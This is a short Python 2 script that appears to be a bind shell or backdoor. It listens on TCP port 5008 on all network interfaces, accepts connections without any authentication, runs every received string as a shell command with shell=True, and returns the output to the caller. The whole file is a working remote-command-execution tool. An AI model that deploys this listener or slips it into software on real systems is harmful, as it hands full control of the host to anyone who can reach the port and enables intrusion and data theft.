import socket
import subprocess


PORT = 5008

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

sock.bind(('0.0.0.0',PORT))
print "Socket bound, listening...."
sock.listen(1)
while True:
    conn, addr = sock.accept()
    conn.send("Connection Established....")
    while True:
        command = conn.recv(2048)
        response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        data = response.stdout.read() + response.stderr.read()
        conn.send(data)
        
sock.close()

